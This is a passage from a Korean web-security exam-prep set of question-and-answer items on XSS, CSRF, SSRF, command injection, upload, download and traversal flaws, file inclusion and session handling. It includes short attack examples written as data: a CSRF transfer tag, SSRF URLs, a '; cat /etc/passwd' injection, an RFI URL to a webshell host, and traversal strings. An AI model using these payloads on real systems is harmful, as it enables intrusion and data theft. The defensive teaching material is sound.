<summary>(서술형) <strong>Stored XSS</strong>와 <strong>Reflected XSS</strong>를 '공격용 악성 스크립트가 보관되는 위치'와 '피해 대상의 범위' 관점에서 비교하여 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>Stored XSS</strong>는 악성 스크립트가 웹 서버의 <strong>DB</strong>에 저장되므로 해당 게시물을 열람하는 <strong>불특정 다수</strong>가 피해를 입는다. 반면 <strong>Reflected XSS</strong>는 스크립트가 DB에 저장되지 않고 <strong>URL 파라미터</strong> 등에 포함되어 일시적으로 반사되므로, 해당 링크를 클릭한 <strong>특정 희생자</strong>에게만 공격이 수행된다.
</blockquote>
</details>

<details>
<summary>(서술형) XSS 대응책 중 하나인 '태그 화이트리스트' 방식의 운영 원리와 장점을 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> 게시판 등에서 HTML 사용이 필요한 경우, 모든 태그를 허용하는 대신 보안상 안전하다고 판단된 <strong>일부 태그 리스트(Whitelist)만 선정</strong>하여 허용하고 나머지 태그는 모두 필터링하거나 이스케이프 처리하는 방식이다. 블랙리스트 방식보다 보안성이 높으며 허용된 범위 내에서만 사용자의 자율성을 보장할 수 있다.
</blockquote>
</details>

<details>
<summary>(작업형) XSS 공격 로그 분석 중 <strong>Referer</strong> 헤더 필드에 나타난 정보가 <code>http://victim.test/board/view.php?num=41</code>일 때, 이를 통해 알 수 있는 사실을 분석하시오.</summary>
<blockquote>
<strong>정답:</strong> 해당 XSS 공격 스크립트가 <code>victim.test</code> 서버의 게시판 <strong>41번 게시물</strong>을 열람하는 시점에서 실행되어 요청이 발생했음을 의미한다. 즉, 해당 게시물이 Stored XSS 공격 코드에 감염되었을 가능성이 매우 높다.
</blockquote>
</details>

<details>
<summary>[558] (단답형) 사용자의 입력값을 적절히 필터링하지 못해 악성 스크립트가 실행되는 <code>XSS</code> 공격 중, 게시판 등에 스크립트를 저장하여 지속적으로 피해를 입히는 방식의 명칭을 쓰시오.</summary>
<blockquote>
Stored XSS (저장형 XSS)
</blockquote>
</details>

### CSRF(Cross Site Request Forgery) 취약점

<details>
<summary>(단답형) 사용자의 의도와 상관없이 공격자가 조작한 유효한 요청(비밀번호 변경, 게시글 작성 등)을 서버로 전송하여 실행하게 만드는 공격은?</summary>
<blockquote>
<strong>정답:</strong> <strong>CSRF</strong> (Cross Site Request Forgery)
</blockquote>
</details>

<details>
<summary>(단답형) CSRF 공격이 성공하기 위해 피해자가 반드시 충족해야 하는 상태 조건은?</summary>
<blockquote>
<strong>정답:</strong> <strong>대상 웹 사이트에 인증된 세션(로그인 상태)이 유지</strong>되고 있어야 한다.
</blockquote>
</details>

<details>
<summary>(단답형) CSRF 공격자가 게시판 등에 <code>&lt;img src="http://bank.test/transfer.php?to=attacker&amp;amount=10000"&gt;</code>와 같은 태그를 삽입했을 때, 이 요청이 사용자 모래 실행되게 만드는 HTML 태그의 속성 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <code>src</code> (또는 <code>href</code>)
</blockquote>
</details>

<details>
<summary>(단답형) CSRF를 방지하기 위해 매 요청마다 서버에서 생성하여 클라이언트에 전달하는 예측 불가능한 임의의 토큰 값은?</summary>
<blockquote>
<strong>정답:</strong> <strong>CSRF Token</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 서버가 수신한 요청의 정당성을 확인하기 위해, 요청 메시지에 포함된 토큰과 비교하는 서버 측 원본 토큰의 저장 위치는?</summary>
<blockquote>
<strong>정답:</strong> <strong>사용자 세션 (Session)</strong>
</blockquote>
</details>

<details>
<summary>(서술형) CSRF 공격이 발생하는 근본적인 원인을 '서버의 요청 판별 능력' 관점에서 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 서버가 수신된 HTTP 요청을 처리할 때, 해당 요청에 유효한 세션 정보(쿠키)가 포함되어 있다면, 그 요청이 실제 사용자의 정당한 클릭으로 발생한 것인지 아니면 위조된 스크립트에 의해 자동 생성된 것인지 <strong>구분하지 못하고 신뢰</strong>하기 때문이다.
</blockquote>
</details>

<details>
<summary>(서술형) 비밀번호 변경 등 민감한 기능을 수행할 때 CSRF 토큰 검증 외에 보안을 더욱 강화할 수 있는 추가적인 프로세스 제어 방안을 제시하시오.</summary>
<blockquote>
<strong>정답:</strong> 기능 실행 직전에 <strong>사용자 재인증(기존 비밀번호 재입력)</strong>을 유도하거나, CAPTCHA 도입, 또는 중요 요청에 대해 추가적인 2차 인증(OTP 등)을 요구하는 절차를 마련하여 공격자의 자동화된 위조 요청을 차단해야 한다.
</blockquote>
</details>

<details>
<summary>(작업형) CSRF 공격은 XSS 공격 기법과 매우 유사한 특성이 있다. 따라서 CSRF를 효과적으로 차단하기 위해 애플리케이션 수준에서 가장 먼저 조치해야 할 선행 보안 작업은?</summary>
<blockquote>
<strong>정답:</strong> 웹 애플리케이션의 <strong>XSS 취약점을 완벽히 제거</strong>해야 한다 (XSS가 존재할 경우 CSRF 방어용 토큰 등을 스크립트로 탈취당할 수 있기 때문).
</blockquote>
</details>

<details>
<summary>[559] (서술형) 크로스 사이트 스크립팅(XSS) 공격과 크로스 사이트 요청 위조(CSRF) 공격의 차이점을 '공격 대상'과 '목적' 측면에서 비교하여 서술하시오.</summary>
<blockquote>
<strong>XSS</strong>: 공격 대상은 '클라이언트(사용자)'이며, 사용자의 브라우저에서 악성 스크립트를 실행시켜 세션 쿠키를 탈취하거나 악성 사이트로 리다이렉트 시키는 것이 목적이다.<br>
<strong>CSRF</strong>: 공격 대상은 '서버(애플리케이션)'이며, 인증된 사용자의 권한을 도용하여 공격자가 의도한 행위(비밀번호 변경, 송금 등)를 서버에 요청하고 실행하게 만드는 것이 목적이다.
</blockquote>
</details>

### Server-Side Request Forgery(SSRF) 취약점

<details>
<summary>(단답형) 공격자가 취약한 웹 애플리케이션을 이용하여, 서버가 직접 사설망 내의 다른 서버나 내부 자원에 악의적인 요청을 보내게 만드는 공격은?</summary>
<blockquote>
<strong>정답:</strong> <strong>SSRF</strong> (Server-Side Request Forgery)
</blockquote>
</details>

<details>
<summary>(단답형) SSRF 대응 방안 중, 외부 시스템이나 내부 자원을 호출할 때 허용된 안전한 URL 목록으로만 입력을 한정하는 방식은?</summary>
<blockquote>
<strong>정답:</strong> <strong>화이트리스트 (Whitelist) 필터링</strong>
</blockquote>
</details>

<details>
<summary>(서술형) <strong>CSRF</strong>와 <strong>SSRF</strong>의 결정적인 차이점을 '조작된 요청의 발생 주체' 관점에서 비교하여 서술하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>CSRF</strong>: 조작된 요청 정보가 <strong>정상적인 사용자(클라이언트)</strong>의 브라우저에서 발생하여 웹 서버로 전송된다.<br>
- <strong>SSRF</strong>: 조작된 요청 정보가 <strong>웹 서버(웹 애플리케이션)</strong> 자체에서 발생하여 내부 또는 외부의 다른 서버로 전송된다.
</blockquote>
</details>

<details>
<summary>(서술형) SSRF 취약점을 이용하여 외부에서 직접 접근이 불가능한 내부 네트워크 정보를 탈취하는 과정을 '웹 서버'의 역할과 연관 지어 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 웹 서버가 외부 사용자로부터 입력받은 URL 파라미터 등을 적절한 검증 없이 내부 시스템 호출에 사용할 경우, 웹 서버는 내부망과 외부망을 연결하는 <strong>프록시(Proxy) 역할</strong>을 하게 된다. 공격자는 이를 통해 보안 장비와 접근 제어를 우회하여, 평소 외부에서 보이지 않는 내부 서버의 포트 스캔이나 중요 데이터 이미지를 웹 서버를 통해 전달받아 탈취할 수 있다.
</blockquote>
</details>

<details>
<summary>(작업형) 웹 서버가 내부 이미지 서버(<code>img.test.com</code>)를 참조하는 <code>?url=http://img.test.com/logo.png</code> 형태의 기능을 제공할 때, SSRF 공격을 시도하기 위한 조작된 URL 파라미터 예시 1가지를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>?url=http://192.168.0.1/admin</code> (내부 네트워크 관리자 페이지 접근 시도) 또는 <code>?url=http://localhost:22</code> (서버 내부 포트 스캔 시도) 등
</blockquote>
</details>

<details>
<summary>[기출 13회 2번 문제] (단답형) 서버가 클라이언트의 요청(URL 등)을 통해 내부 네트워크 자원이나 외부의 다른 서버에 접근하게 되는 취약점 공격은?</summary>
<blockquote>
<strong>정답:</strong> <strong>SSRF (Server-Side Request Forgery)</strong><br>
<strong>해설:</strong> 공격자가 조작한 URL을 서버가 직접 호출하게 하여, 외부에서 접근 불가능한 내부 시스템 정보를 탈취하거나 내부 포트 스캔 등에 악용하는 공격이다.
</blockquote>
</details>

### 운영체제 명령 실행(OS Command Execution) 취약점

<details>
<summary>(단답형) 부적절하게 검증된 사용자 입력값이 운영체제 명령의 일부로 전달되어 의도하지 않은 시스템 명령이 실행되는 취약점은?</summary>
<blockquote>
<strong>정답:</strong> <strong>운영체제 명령 실행 (OS Command Injection)</strong> 취약점
</blockquote>
</details>

<details>
<summary>(단답형) 유닉스/리눅스 시스템에서 두 개 이상의 명령어를 연속해서(순차적으로) 실행하기 위해 명령어 사이에 삽입하는 특수 기호는?</summary>
<blockquote>
<strong>정답:</strong> <code>;</code> (세미콜론)
</blockquote>
</details>

<details>
<summary>(단답형) 앞선 명령어의 실행 결과가 참(True/성공)일 때만 다음 명령어를 호출하도록 연결하는 논리 연산자 기호는?</summary>
<blockquote>
<strong>정답:</strong> <code>&amp;&amp;</code>
</blockquote>
</details>

<details>
<summary>(단답형) 앞선 명령어의 실행 결과가 거짓(False/실패)일 때만 다음 명령어를 호출하도록 연결하는 논리 연산자 기호는?</summary>
<blockquote>
<strong>정답:</strong> <code>||</code>
</blockquote>
</details>

<details>
<summary>(단답형) 앞선 명령어의 출력(Output) 결과를 다음 명령어의 표준 입력(Input)으로 전달하기 위해 사용하는 기호는?</summary>
<blockquote>
<strong>정답:</strong> <code>|</code> (파이프)
</blockquote>
</details>

<details>
<summary>(단답형) PHP 환경에서 웹 애플리케이션이 운영체제 명령을 직접 호출하기 위해 사용하는 대표적인 함수 4가지를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>system()</code>, <code>exec()</code>, <code>shell_exec()</code>, <code>passthru()</code>
</blockquote>
</details>

<details>
<summary>(서술형) <code>ping -c 4 [사용자 입력값]</code> 구조로 동작하는 웹 페이지에서, 공격자가 <code>127.0.0.1 ; cat /etc/passwd</code>를 입력했을 때 발생하는 보안 사고와 그 원리를 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>원리</strong>: 세미콜론(<code>;</code>)은 한 줄에서 여러 명령을 실행하게 해준다. 이에 따라 서버는 정상적인 ping 명령을 마친 후 즉시 <code>cat /etc/passwd</code> 명령을 실행하게 된다.<br>
<strong>보안 사고</strong>: 결과적으로 웹 응답 페이지에 서버 내의 <strong>시스템 계정 정보(/etc/passwd)가 무단 유출</strong>되게 된다.
</blockquote>
</details>

<details>
<summary>(서술형) OS Command Injection을 방어하기 위해 애플리케이션 소스 코드 단에서 수행해야 할 근본적인 대응 방안 2가지를 제시하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1. <strong>입력값 필터링</strong>: 명령어 실행에 악용될 수 있는 특수문자(<code>;</code>, <code>&amp;</code>, <code>|</code>, <code>`</code> 등)를 차단하거나 제거한다.<br>
2. <strong>화이트리스트 기반 명령어 제한</strong>: 운영상 꼭 필요한 명령어만 실행될 수 있도록 미리 정의된 허용 목록(Whitelist)을 선정하여 관리한다.
</blockquote>
</details>

<details>
<summary>(작업형) 웹 보안 장비(WAF)를 통해 명령 실행 공격을 차단하고자 할 때, 필터링 정책(Rule-set)에 반드시 포함시켜야 할 리눅스 중요 시스템 파일 경로와 명령어를 1가지씩 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> 경로: <code>/etc/passwd</code> (또는 <code>/etc/shadow</code>), 명령어: <code>cat</code>, <code>ls</code>, <code>id</code>, <code>rm</code> 등
</blockquote>
</details>

### 파일 업로드 취약점

<details>
<summary>(단답형) 파일 업로드 기능이 있는 웹 페이지에서 필터링 미흡을 틈타 업로드된 후, 원격 명령 실행이나 정보 탈취를 수행하는 서버 사이드 스크립트 파일은?</summary>
<blockquote>
<strong>정답:</strong> <strong>웹쉘 (WebShell)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 텍스트 데이터 전송용 프로토콜에서 바이너리 데이터를 손실 없이 전달하기 위해, 64개의 ASCII 문자와 패딩 문자(=)를 사용하는 인코딩 방식은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Base-64</strong> (베이스64)
</blockquote>
</details>

<details>
<summary>(단답형) 웹을 통해 파일을 전달할 때 HTTP 메시지의 <code>Content-Type</code> 헤더에 명시되는 표준 파일 형식 포맷(예: image/jpeg)은?</summary>
<blockquote>
<strong>정답:</strong> <strong>MIME 타입</strong> (Multipurpose Internet Mail Extensions)
</blockquote>
</details>

<details>
<summary>(단답형) PHP에서 문자열을 코드로 해석하여 실행할 때 사용되며, 웹쉘의 핵심 엔진으로 자주 악용되는 함수는?</summary>
<blockquote>
<strong>정답:</strong> <code>eval()</code>
</blockquote>
</details>

<details>
<summary>(단답형) 아파치(Apache) 서버에서 업로드 용량 제한을 위해 <code>POST</code>, <code>PUT</code> 바디의 최대 크기(바이트)를 지정하는 지시어는?</summary>
<blockquote>
<strong>정답:</strong> <code>LimitRequestBody</code>
</blockquote>
</details>

<details>
<summary>(단답형) 업로드 용량이 서버 설정치를 초과했을 때 반환되는 HTTP 응답 상태 코드는?</summary>
<blockquote>
<strong>정답:</strong> <strong>413</strong> (Request Entity Too Large)
</blockquote>
</details>

<details>
<summary>(서술형) 파일 업로드 시 <strong>MIME 타입 검증</strong>만 수행하는 서버의 보안 정책을 공격자가 웹 프록시 도구를 사용하여 우회하는 과정을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 공격자는 실행 가능한 웹쉘(<code>.php</code>)을 업로드하면서, 웹 프록시를 이용해 요청 메시지의 <code>Content-Type</code> 필드값을 서버가 허용하는 화이트리스트 타입(예: <code>image/gif</code>, <code>image/png</code>)으로 <strong>변조하여 전송</strong>함으로써 서버 측의 타입 검증 로직을 우회할 수 있다.
</blockquote>
</details>

<details>
<summary>(서술형) 아파치(Apache) 서버에서 <strong>.htaccess(액세스 파일)</strong>를 이용해 업로드 디렉터리 내의 웹쉘 실행을 원천 차단하는 구체적인 방법 2가지를 서술하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1. <code>FilesMatch</code> 지시어 활용: 실행 파일 확장자(<code>.php</code>, <code>.inc</code> 등)에 대해 <code>Deny from all</code> 설정을 적용하여 직접적인 <strong>URL 호출을 차단</strong>한다.<br>
2. <code>AddType</code> 지시어 활용: PHP 확장자의 MIME 타입을 <code>text/html</code> 등으로 재정의하여, 서버가 이를 <strong>스크립트가 아닌 일반 문서로 처리</strong>하도록 설정한다.
</blockquote>
</details>

<details>
<summary>(서술형) 윈도우 <strong>IIS 웹 서버</strong> 운영 환경에서 파일 업로드 디렉터리의 위험을 줄이기 위해 수행해야 할 '응용 프로그램 설정' 조치는?</summary>
<blockquote>
<strong>정답:</strong> 업로드 전용 디렉터리의 등록 정보에서 <strong>'실행 권한'을 '없음'</strong>으로 설정하여, 해당 폴더 내의 서버 사이드 스크립트(ASP 등)가 엔진에 의해 실행되지 않도록 조치해야 한다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음 PHP 기반의 파일 업로드 처리 로직을 분석하여, 보안을 위해 <strong>파일명(File Name)</strong>을 어떻게 관리해야 하는지 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> 사용자가 올린 원래 파일명 대신 <strong>서버에서 생성한 난수 형태의 파일명(예: 2016_02_15_…_0.php)</strong>으로 변경하여 유추 불가능한 위치에 저장해야 한다. 이를 통해 공격자가 업로드한 웹쉘의 실행 경로(URL)를 쉽게 알아내지 못하도록 방해할 수 있다.
</blockquote>
</details>

### 파일 다운로드 취약점

<details>
<summary>(단답형) 파일 다운로드 시 파일의 경로나 이름을 파라미터로 처리할 때 검증이 미흡하여, 공격자가 중요 소스나 시스템 파일을 무단으로 내려받는 취약점은?</summary>
<blockquote>
<strong>정답:</strong> <strong>파일 다운로드</strong> 취약점
</blockquote>
</details>

<details>
<summary>(단답형) 유닉스/리눅스 환경에서 현재 디렉터리보다 한 단계 상위 디렉터리로 이동하여 중요 파일에 접근하기 위해 파일 이름 앞에 붙이는 문자열은?</summary>
<blockquote>
<strong>정답:</strong> <code>../</code>
</blockquote>
</details>

<details>
<summary>(단답형) 윈도우(Windows) 기반 시스템 환경에서 경로를 거슬러 올라가기 위해 파일 다운로드 공격 파라미터에 사용하는 역슬래시 문자열은?</summary>
<blockquote>
<strong>정답:</strong> <code>..\</code> (또는 <code>..\\</code>)
</blockquote>
</details>

<details>
<summary>(서술형) 파일 다운로드 취약점을 통해 공격자가 웹 소스 코드(download.php 등)를 탈취했을 때 발생할 수 있는 추가적인 보안 위협을 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> 소스 코드가 유출되면 웹 애플리케이션의 <strong>내부 비즈니스 로직</strong>이 노출될 뿐만 아니라, 하드코딩된 <strong>데이터베이스 접속 계정 정보</strong>, 암호화 키, 또는 타 시스템과의 연동을 위한 인증 토큰 등이 유출되어 2차, 3차 침해 사고로 이어질 가능성이 매우 높다.
</blockquote>
</details>

<details>
<summary>(서술형) 웹 애플리케이션 수준에서 파일 다운로드 취약점을 방지하기 위한 블랙리스트 필터링 대상 문자열 3가지를 제시하시오.</summary>
<blockquote>
<strong>정답:</strong> <code>../</code> (상위 경로 이동), <code>./</code> (현재 경로), <code>..\</code> (윈도우 상위 경로) 등.
</blockquote>
</details>

<details>
<summary>(작업형) 정상 경로가 <code>?real_name=photo.jpg</code>일 때, 공격자가 <code>real_name</code> 파라미터 값을 <code>../config.php</code>로 조작하여 성공적으로 다운로드했다면, 이 행위의 목적과 공격 기법명을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>목적</strong>: 웹 서버의 중요 설정 파일(DB 연동 등)을 탈취하기 위함.<br>
<strong>공격 기법</strong>: <strong>파일 다운로드</strong> (Directory Traversal 기반) 취약점 공격
</blockquote>
</details>

### 경로 추적(Path Traversal) 취약점

<details>
<summary>(단답형) 파일이나 디렉터리 접근 통제가 미흡하여, 공격자가 웹 루트를 벗어나 시스템의 민감한 파일에 접근하거나 실행하는 취약점은?</summary>
<blockquote>
<strong>정답:</strong> <strong>경로 추적 (Path/Directory Traversal)</strong> 취약점
</blockquote>
</details>

<details>
<summary>(단답형) 경로 추적 공격 시 상위 디렉터리를 참조하기 위해 사용하는 <code>../</code>와 같은 문자열을 의미하는 영어 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>dot-dot-slash</strong>
</blockquote>
</details>

<details>
<summary>(단답형) URL 인코딩된 값을 한 번 더 <code>%25</code>를 사용하여 인코딩함으로써 필터링 로직을 무력화하는 우회 기법은?</summary>
<blockquote>
<strong>정답:</strong> <strong>더블 URL 인코딩 (Double URL Encoding)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 16비트 유니코드(Unicode) 인코딩 방식으로 리눅스의 슬래시(<code>/</code>)를 표현했을 때의 값은?</summary>
<blockquote>
<strong>정답:</strong> <code>%u2215</code> (역슬래시는 <code>%u2216</code> 또는 <code>%u2216</code>)
</blockquote>
</details>

<details>
<summary>(단답형) 유닉스/리눅스 시스템에서 특정 디렉터리를 가상의 최상위 루트(<code>/</code>)로 설정하여, 시스템 루트 디렉터리에 대한 무단 접근을 차단하는 기능은?</summary>
<blockquote>
<strong>정답:</strong> <strong>chroot</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 윈도우 IIS 웹 서버의 기본 CGI 디렉터리로, 공격자가 경로 추적을 통해 <code>cmd.exe</code>를 호출할 때 경로 상의 주요 경유지로 악용되는 디렉터리 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <code>scripts</code>
</blockquote>
</details>

<details>
<summary>(서술형) 아파치(Apache) 웹 서버 로그에서 <code>../</code>를 포함한 요청에 대해 다수의 <strong>404 (Not Found)</strong> 상태 코드 뒤에 <strong>200 (OK)</strong> 상태 코드가 나타났다면, 이를 보안 관점에서 어떻게 분석해야 하는지 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> 공격자가 다양한 인코딩 방식이나 <code>../</code> 중첩 회수를 조작하며 경로 추적을 시도하다가, 최종적으로 <strong>취약한 경로나 인코딩 방식을 찾아 시스템 파일 접근에 성공</strong>한 것으로 분석해야 한다.
</blockquote>
</details>

<details>
<summary>(서술형) 경로 조작 문자(<code>../</code>)를 단순히 빈 문자(<code>""</code>)로 치환(Replace)하여 필터링하는 방식의 취약점을 우회 사례를 들어 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 공격자가 <code>….//</code>와 같은 중첩된 문자열을 입력하면, 서버가 중앙의 <code>../</code>를 제거한 후 남은 문자열들이 다시 조합되어 <strong>결과적으로 <code>../</code>가 재생성</strong>되므로 필터링이 무력화될 수 있다.
</blockquote>
</details>

<details>
<summary>(서술형) 윈도우 서버를 대상으로 한 공격 로그 중 <code>cmd.exe?/c+dir</code> 구문의 의미와 공격자의 의도를 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 공격자가 윈도우의 명령 프롬프트(<code>cmd.exe</code>)를 실행시키면서, <code>/c</code> 옵션을 이용해 뒤따르는 <code>dir</code> 명령을 수행하고 즉시 종료하도록 조작한 것이다. 이를 통해 <strong>서버의 디렉터리 파일 목록을 무단으로 탈취</strong>하려는 의도를 가진다.
</blockquote>
</details>

<details>
<summary>(작업형) 웹 서버의 경로 추적 공격에 대비하여 사용자가 접근 가능한 최상위 경로를 물리적으로 격리하는 방안을 운영체제별(리눅스, 윈도우)로 각각 1가지씩 기재하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>유닉스/리눅스</strong>: <code>chroot</code> 명령을 사용하여 웹 루트 디렉터리를 가상의 루트 디렉터리로 설정한다.<br>
- <strong>윈도우</strong>: 시스템 드라이브(<code>C:</code>)가 아닌 <strong>별도의 논리 드라이브(예: <code>D:</code>)</strong>를 생성하여 웹 루트 디렉터리로 지정함으로써 상위 시스템 파일 접근을 차단한다.
</blockquote>
</details>

<details>
<summary>[560] (단답형) 공격자가 웹 통신 과정에서 전달되는 파라미터나 헤더 값 등을 조작하여, 다른 사용자의 디렉터리나 민감한 시스템 파일(예: <code>/etc/passwd</code>)에 무단으로 접근하고 이를 열람하는 웹 뷰어 취약점 공격의 명칭을 영소문자 약어로 쓰시오.</summary>
<blockquote>
<code>lfi</code> (Local File Inclusion) 또는 <code>pdt</code> (Path Directory Traversal)
</blockquote>
</details>

### 파일 삽입 취약점

<details>
<summary>(단답형) 공격자가 조작한 악성 서버 스크립트 파일이 정당한 페이지의 일부로 포함되어 실행되도록 만드는 취약점의 총칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>파일 삽입</strong> (File Inclusion) 취약점
</blockquote>
</details>

<details>
<summary>(단답형) 삽입할 파일의 위치가 웹 서버 내부(로컬)인 경우(LFI)와 원격 서버(원격지)인 경우(RFI)로 나뉘는 취약점의 영문 약어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>LFI</strong> (Local File Inclusion) / <strong>RFI</strong> (Remote File Inclusion)
</blockquote>
</details>

<details>
<summary>(단답형) PHP 환경에서 파일을 포함할 때 사용되는 함수로, 포함하려는 파일에 오류가 있어도 경고만 출력하고 실행을 계속하는 함수는?</summary>
<blockquote>
<strong>정답:</strong> <code>include()</code>
</blockquote>
</details>

<details>
<summary>(단답형) PHP 환경에서 파일을 포함할 때 사용되는 함수로, 파일 포함 실패 시 즉시 에러를 발생시키고 스크립트 실행을 중단하는 함수는?</summary>
<blockquote>
<strong>정답:</strong> <code>require()</code>
</blockquote>
</details>

<details>
<summary>(단답형) <code>http://target.com/index.php?page=http://hacker.com/webshell.php</code>와 같은 형태의 공격을 시도할 때, 이 행위가 성공하기 위한 전제 조건이 되는 <code>php.ini</code> 설정 항목은?</summary>
<blockquote>
<strong>정답:</strong> <code>allow_url_fopen = On</code> (또는 <code>allow_url_include = On</code>)
</blockquote>
</details>

<details>
<summary>(서술형) <strong>LFI</strong>와 <strong>RFI</strong> 공격의 근본적인 차이점을 '악성 스크립트 보관 위치' 관점에서 구분하여 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>LFI</strong>는 웹 서버 내부에 이미 업로드된 파일이나 시스템 파일(예: 로그 파일, 설정 파일 등)을 포함시켜 실행하는 반면, <strong>RFI</strong>는 외부 원격지 서버에 위치한 악성 스크립트 URL을 직접 호출하여 웹 애플리케이션 내에 삽입 및 실행시키는 차이가 있다.
</blockquote>
</details>

<details>
<summary>(서술형) 파일 삽입 취약점에 의한 정보 유출을 최소화하기 위해 <code>php.ini</code> 설정 파일에서 <code>display_errors = Off</code> 처리가 필요한 이유를 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> 오류 발생 시 서버 내부의 <strong>구체적인 경로 정보</strong>나 소스 코드의 일부 내용이 브라우저에 그대로 출력되는 것을 방지함으로써, 공격자에게 추가적인 공격 힌트(디렉터리 구조 등)를 제공하지 않기 위함이다.
</blockquote>
</details>

<details>
<summary>[기출 22회 5번 문제] (단답형) 파일 삽입 취약점은 공격자가 악성 스크립트를 서버에 전달하여 실행되도록 할 수 있다. PHP 환경에서 외부 URL을 통한 파일 삽입을 방지하기 위한 <code>php.ini</code> 설정값 2가지를 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>allow_url_fopen = Off</strong>, <strong>allow_url_include = Off</strong>
</blockquote>
</details>

### URL/파라미터 변조 취약점

<details>
<summary>(단답형) 웹 애플리케이션의 실행 경로에 대해 접근 제어가 미흡하여, 공격자가 요청 파라미터를 조작해 자신에게 허용되지 않은 정보에 접근하는 취약점은?</summary>
<blockquote>
<strong>정답:</strong> <strong>URL / 파라미터 변조</strong> 취약점
</blockquote>
</details>

<details>
<summary>(단답형) 사용자 정보 수정 요청 시 <code>id=user1</code> 파라미터를 <code>id=admin</code>으로 변조하여 관리자 정보를 탈취하는 공격에 주로 사용되는 도구는?</summary>
<blockquote>
<strong>정답:</strong> <strong>웹 프록시 (Web Proxy)</strong> (예: Burp Suite, Paros 등)
</blockquote>
</details>

<details>
<summary>(단답형) 클라이언트로부터 전송된 파라미터 조작에 의한 보안 위협을 방지하기 위해, 서버 측에서 사용자를 식별하고 데이터를 신뢰하기 위해 사용하는 정보 저장소는?</summary>
<blockquote>
<strong>정답:</strong> <strong>서버 세션 (Session)</strong>
</blockquote>
</details>

<details>
<summary>(서술형) <strong>URL/파라미터 변조</strong> 취약점이 SQL Injection이나 크로스 사이트 스크립팅(XSS)과 같은 다른 웹 취약점과 어떠한 상관관계를 갖는지 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 파라미터 변조는 사용자 입력값에 대한 검증 누락이 발생하는 모든 상황을 포괄한다. 따라서 조작된 파라미터에 SQL 쿼리 문법을 삽입하면 SQL Injection이 되고, 악성 스크립트 구문을 삽입하면 XSS 공격으로 이어지는 등 <strong>다양한 공격의 시발점</strong>이 되는 특징이 있다.
</blockquote>
</details>

<details>
<summary>(서술형) 중요 정보가 포함된 페이지에서 파라미터 변조 여부를 검증하기 위한 애플리케이션 차원의 프로세스 제어 방안 2가지를 제시하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1. <strong>세션 대조</strong>: 요청에 포함된 ID 등의 파라미터 값이 현재 서버에 생성된 사용자 인증 세션 정보와 일치하는지 서버 단에서 교차 검증한다.<br>
2. <strong>재인증 수행</strong>: 개인정보 수정 등 중요한 기능 수행 직전에 사용자의 비밀번호를 다시 확인하는 <strong>재인증(Re-authentication)</strong> 단계를 거쳐 세션 탈취나 위조를 차단한다.
</blockquote>
</details>

<details>
<summary>(작업형) 사용자의 포인트 점수를 차감하는 비즈니스 로직에서 <code>?amount=100</code> 파라미터를 <code>?amount=-5000</code>으로 변조했을 때 포인트가 오히려 증가한다면, 이러한 취약점을 분류하는 명칭은 무엇인가?</summary>
<blockquote>
<strong>정답:</strong> <strong>데이터 변조</strong>(또는 비즈니스 로직 취약점에 따른 파라미터 변조)
</blockquote>
</details>

### 불충분한 세션 관리 취약점

<details>
<summary>(단답형) 공격자가 타인의 유효한 세션 ID를 탈취하여 별도의 로그인 없이 해당 사용자의 권한으로 시스템을 이용하는 공격은?</summary>
<blockquote>
<strong>정답:</strong> <strong>세션 하이재킹 (Session Hijacking)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 자바스크립트 등 웹 브라우저 스크립트 언어를 통한 쿠키 접근을 차단하여 XSS에 의한 세션 ID 유출을 방어하는 쿠키 속성은?</summary>
<blockquote>
<strong>정답:</strong> <strong>HttpOnly</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 암호화된 HTTPS 통신 환경에서만 쿠키가 서버로 전송되도록 강제하여, 평문 통신 중 쿠키 노출을 방지하는 쿠키 속성은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Secure</strong>
</blockquote>
</details>

<details>
<summary>(단답형) PHP 설정 파일(<code>php.ini</code>)에서 세션이 유지되는 최대 시간(초 단위)을 지정하여 세션 타임아웃을 관리하는 설정 항목은?</summary>
<blockquote>
<strong>정답:</strong> <code>session.gc_maxlifetime</code>
</blockquote>
</details>

<details>
<summary>(단답형) 서버가 클라이언트 브라우저에 세션 쿠키를 생성하라고 명령하기 위해 HTTP 응답 헤더에 사용하는 필드의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <code>Set-Cookie</code>
</blockquote>
</details>

<details>
<summary>(서술형) <strong>HttpOnly</strong> 속성이 적용된 쿠키가 XSS 공격으로부터 사용자를 보호하는 원리를 구체적으로 설명하시오.</summary>
<blockquote>
